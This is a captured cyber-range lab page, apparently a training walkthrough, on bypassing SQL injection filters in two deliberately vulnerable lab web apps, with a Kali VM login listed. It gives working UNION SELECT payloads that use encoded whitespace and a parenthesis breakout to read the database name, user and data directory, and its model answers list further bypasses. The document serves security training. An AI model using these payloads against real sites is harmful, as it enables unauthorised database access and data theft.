@@ -1,0 +1,165 @@
+Timestamp: 2025-12-28T12:09:11.795116
+URL: https://app.cyberranges.com/instance/start/695101c3dabdba0ee85a7505
+Title: Loading Scenario - CYBER RANGES
+Hash: 8655501afb23cc41a440ade0301edba43e2fe63fcf987d416fcb17e8bc416ee3
+================================================================================
+MISSION
+RULES
+LEADERBOARD
+VPN
+SQL INJECTION (ERROR-BASED) 102
+INTRODUCTION
+
+An SQL injection attack is an injection of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data, execute administration operations on the database, and recover the content of a given file present on the DBMS file system.
+
+This scenario will have two applications that are vulnerable to SQL injection (error-based) and will be more difficult than the scenario SQL injection 101. We will be covering bypassing certain filters applied to prevent SQL injection.
+
+Why This Matters
+
+In realistic penetration testing engagements, web applications rarely leave themselves open to basic SQL injection attacks. Developers often implement filters to block common SQL keywords and characters. As a security professional, it's crucial to understand how to identify and bypass these filters to uncover vulnerabilities that automated tools might miss. This lab focuses on manual techniques for bypassing these common defenses in an error-based SQL injection context.
+
+Lab Access Guidelines
+VM	IP/URL	Username	Password
+Kali	192.168.125.100	rangeadmin	password_CR1
+Application 1	http://192.168.125.130:8000/site1/index.php	N/A	N/A
+Application 2	http://192.168.125.130:9000/site2/index.php	N/A	N/A
+
+For VPN access steps see the Rules section.
+
+FILTER BYPASS PART 1
+
+In this section, we will target Application 1 at http://192.168.125.130:8000/site1/index.php.
+
+Confirm the Injection Point: The application hints that the id parameter is vulnerable. To confirm this, we provide a single quote as input, which should trigger a database error.
+
+http://192.168.125.130:8000/site1/index.php?id='
+
+The resulting MySQL error confirms the vulnerability.
+
+	
+
+Key Point: An unhandled database error is a strong indicator of an SQL injection vulnerability. The goal is to turn this error into a controlled output.
+
+Identify and Bypass Filters: Let's attempt to use common SQL keywords and observe the application's behavior.
+
+Space and 'Or' filter: An attempt with order by shows that both spaces and the word "Or" are blacklisted.
+
+http://192.168.125.130:8000/site1/index.php?id=1' Order by 3 '1
+
+Bypass with URL and ASCII encoding: We can bypass the space filter using %A0 (a non-breaking space) and the ampersand filter by URL-encoding it to %26%26.
+
+NOTE: The browser might automatically URL-encode characters you type into the address bar. Be mindful of double-encoding. It's often better to use a tool like Burp Suite's Repeater to have full control over the payload sent to the server.
+
+	
+
+Reflection Point: After discovering that spaces and the keyword 'Or' are filtered, what other characters or encoding techniques could you have tried to bypass the space filter, and why might they work?
+
+Model Answer: You could try other whitespace characters like tabs (%09), newlines (%0a), or carriage returns (%0d). Another common technique is using comments like /**/ in place of spaces. These work because a weak filter might only be looking for the standard space character (%20) and not other forms of whitespace that the database engine will still interpret correctly.
+
+Determine the Number of Columns: Since order by is filtered, we will use UNION SELECT to determine the number of columns by guessing.
+
+A payload with four columns results in an error, indicating fewer than four columns.
+
+http://192.168.125.130:8000/site1/index.php?id=1'%A0UNION%a0SELECT%a01,2,3,4%26%26%a0 '1
+
+A payload with three columns removes the error, confirming the column count.
+
+http://192.168.125.130:8000/site1/index.php?id=1'%A0UNION%a0SELECT%a01,2,3%26%26%a0 '1
+
+Extract Database Information: Now that we have a working UNION SELECT payload, we can extract information. We'll set the id to 0 to ensure our injected query is the one that returns data.
+
+	
+
+Key Point: Setting the initial ID to a non-existent value (like 0 or a very large number) is crucial. It ensures the first part of the query returns no results, forcing the application to display the results of your injected `UNION SELECT` statement.
+
+Find the Reflection Point:
+
+http://192.168.125.130:8000/site1/index.php?id=0'%A0UNION%a0SELECT%a01,2,3%26%26%a0 '1
+
+The output shows that columns 1 and 2 are reflected. We will use the second column for our data extraction.
+
+Extract Database Name: Replace the second column with database().
+
+http://192.168.125.130:8000/site1/index.php?id=0'%A0UNION%a0SELECT%a01,database(),3%26%26%a0 '1
+
+The database name is security.
+
+Extract Database Version and User: Similarly, use version() and user() to get more information.
+
+http://192.168.125.130:8000/site1/index.php?id=0'%A0UNION%a0SELECT%a01,version(),3%26%26%a0 '1
+http://192.168.125.130:8000/site1/index.php?id=0'%A0UNION%a0SELECT%a01,user(),3%26%26%a0 '1
+
+Find the flag inside of the database name you found!
+
+Having successfully bypassed space and keyword filters in the first application, we will now turn our attention to the second application. This next challenge introduces different filtering mechanisms that will require new bypass techniques.
+
+FILTER BYPASS PART 2
+
+In this section, we will use application 2 running on the URL http://192.168.125.130:9000/site2/index.php.
+
+Confirm the Injection Point: Again, we see the vulnerable parameter is id. We'll begin with the injection of a single quote with an id of 4.
+
+http://192.168.125.130:9000/site2/index.php?id=4'
+
+We get an error, confirming the vulnerability. Notice the parenthesis in the error message; this tells us our injection point is inside parentheses.
+
+NOTE: The presence of a parenthesis `)` in the error message `near ''4'')' LIMIT 0,1` is a critical clue. It means the original query looks something like `SELECT ... WHERE id=('4')`. Your payload must correctly close this parenthesis and balance the query syntax to be successful.
+
+Initial Probing and Filter Identification: Let's try a simple true condition.
+
+http://192.168.125.130:9000/site2/index.php?id=4' or '1'='1
+
+No error is returned. Now let's try to determine the number of columns using UNION SELECT, making sure to break out of the parenthesis.
+
+http://192.168.125.130:9000/site2/index.php?id=4') union select 1,2,3 AND ('4
+
+The output shows that spaces are being removed. We need to find a bypass for this.
+
+	
+
+Reflection Point: Why is it necessary to change the id parameter to a non-existent value like 0 before extracting information with the UNION SELECT payload? What would likely happen if you left the id as `1`?
+
+Model Answer: Setting id=0 ensures the original SELECT query returns no results. In a UNION, only the first query's results are typically displayed if it returns data. By making the first query fail, we force the application to display the results from our injected SELECT query, which contains the database information we want to extract. If id was left as `1`, the application would likely display the legitimate data for user 1, and our injected data would not be visible.
+
+Bypass Space Filtering: We can use a combination of %0a (newline) and %a0 (non-breaking space) to bypass this restriction.
+
+http://192.168.125.130:9000/site2/index.php?id=4')%0aunion%a0select%0a1,2,3%0aAND%0a('4
+
+The query now works, confirming we have three columns.
+
+NOTE: While both %20 (standard space) and %A0 (non-breaking space) can create whitespace, they are not interchangeable. Some filters only block the standard space character. Using alternatives like %A0, %0a (newline), %0d (carriage return), or even comments `/**/` can bypass naive filters.
+
+Extract Database Information: Now we can use our working payload to extract information. We'll set the id to 0 again.
+
+Extract MySQL Directory:
+
+http://192.168.125.130:9000/site2/index.php?id=0')%0aunion%a0select%0a1,@@datadir,3%0aAND%0a('4
+
+Extract Database Name:
+
+http://192.168.125.130:9000/site2/index.php?id=0')%0aunion%a0select%0a1,database(),3%0aAND%0a('4
+
+Extract Database User:
+
+http://192.168.125.130:9000/site2/index.php?id=0')%0aunion%a0select%0a1,user(),3%0aAND%0a('4
+
+The user is root@localhost.
+
+Find the flag inside the database name you found while exploiting application.
+
+Through these two exercises, we have demonstrated that even with security filters in place, determined attackers can find ways to exploit SQL injection vulnerabilities. Let's summarize what we have accomplished.
+
+CONCLUSION
+
+In this lab, we successfully demonstrated how to bypass common security filters in two different web applications vulnerable to error-based SQL injection. Key takeaways include:
+
+Identifying and Bypassing Filters: We saw that developers often filter spaces and common keywords like 'OR' and 'UNION'. We successfully bypassed these using techniques like URL encoding (%26%26), ASCII encoding for non-breaking spaces (%A0), and newline characters (%0a).
+Adapting Payloads: Each application required a different approach. The first required us to bypass space and keyword filters, while the second involved breaking out of parentheses and dealing with stripped spaces. This highlights the importance of careful observation and adaptation in penetration testing.
+Manual Exploitation is Key: These types of filter bypasses often require manual testing and cannot be reliably found with automated scanners. The techniques practiced in this lab are crucial for any security professional looking to perform a thorough web application assessment.
+
+By understanding these bypass techniques, you are better equipped to identify and exploit complex SQL injection vulnerabilities that might otherwise go unnoticed.
+
+SQL Injection (Error-Based) 102
+By Franko Janku
+Loading...
+Pending creation of scenario
